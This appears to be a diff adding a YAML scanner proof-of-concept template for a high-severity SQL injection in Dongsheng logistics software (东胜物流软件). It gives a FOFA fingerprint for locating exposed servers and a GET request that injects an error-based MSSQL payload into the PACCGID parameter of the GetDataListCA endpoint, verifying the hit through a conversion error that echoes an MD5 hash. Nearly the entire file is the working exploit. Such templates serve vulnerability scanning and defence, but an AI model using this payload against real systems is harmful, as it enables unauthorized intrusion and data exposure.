@@ -1,0 +1,17 @@
+id: poc-yaml-dongshengsoft-getdatalistca-sqli
+info:
+  name: 东胜物流软件 GetDataListCA SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 东胜物流软件
+  fofa: fid="Z4c2hPCi5IR/AnH5vZXNSQ=="
+variables:
+  t1: random_int(1000,10000)
+  t2: md5(t1)
+requests:
+- method: GET
+  path: /MvcShipping/MsCwGenlegAccitems/GetDataListCA?PACCGID=1')%20AND%206782%20IN%20(SELECT%20(sys.fn_varbintohexstr(hashbytes('MD5','{{.t1}}'))))--+OevW
+  expression: status_code == 500 && contains(body,"在将 nvarchar 值") && contains(body,"转换成数据类型
+    int 时失败") && contains(body,t2)
+transport: http
